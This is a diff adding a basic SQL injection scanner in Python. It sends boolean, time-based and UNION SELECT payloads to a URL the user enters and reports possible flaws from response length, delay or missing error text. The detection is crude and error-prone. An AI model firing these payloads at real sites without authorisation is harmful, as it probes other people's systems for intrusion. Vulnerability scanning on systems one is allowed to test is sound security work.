@@ -26,6 +26,59 @@ Description:
     A Python tool to detect basic SQL Injection vulnerabilities
     by testing URLs and HTML forms for common SQL error patterns.
 """
+import requests
+import time
+
+# Common test payloads
+payloads = {
+    "boolean_based": [
+        "' AND 1=1-- -",   # True
+        "' AND 1=2-- -"    # False
+    ],
+    "time_based": [
+        "' AND SLEEP(3)-- -",   # Delay injection
+    ],
+    "union_based": [
+        "' UNION SELECT NULL,NULL-- -",
+        "' UNION SELECT NULL,NULL,NULL-- -",
+        "' UNION SELECT NULL,NULL,NULL,NULL-- -"
+    ]
+}
+
+def test_boolean_based(url):
+    print("[*] Testing Boolean-based SQLi...")
+    r1 = requests.get(url + payloads["boolean_based"][0])
+    r2 = requests.get(url + payloads["boolean_based"][1])
+    if len(r1.text) != len(r2.text):
+        print("[+] Possible Boolean-based SQLi detected!")
+    else:
+        print("[-] Boolean-based SQLi not detected.")
+
+def test_time_based(url):
+    print("[*] Testing Time-based SQLi...")
+    start = time.time()
+    requests.get(url + payloads["time_based"][0])
+    end = time.time()
+    if end - start >= 3:
+        print("[+] Possible Time-based SQLi detected!")
+    else:
+        print("[-] Time-based SQLi not detected.")
+
+def test_union_based(url):
+    print("[*] Testing UNION-based SQLi...")
+    for payload in payloads["union_based"]:
+        r = requests.get(url + payload)
+        if "error" not in r.text.lower() and r.status_code == 200:
+            print(f"[+] Possible UNION-based SQLi with payload: {payload}")
+            return
+    print("[-] UNION-based SQLi not detected.")
+
+if __name__ == "__main__":
+    print("=== SQL Injection Scanner ===")
+    target = input("Enter target URL with vulnerable parameter (e.g. http://site.com/page.php?id=1): ")
+    test_boolean_based(target)
+    test_time_based(target)
+    test_union_based(target)
 
 import sys
 import requests
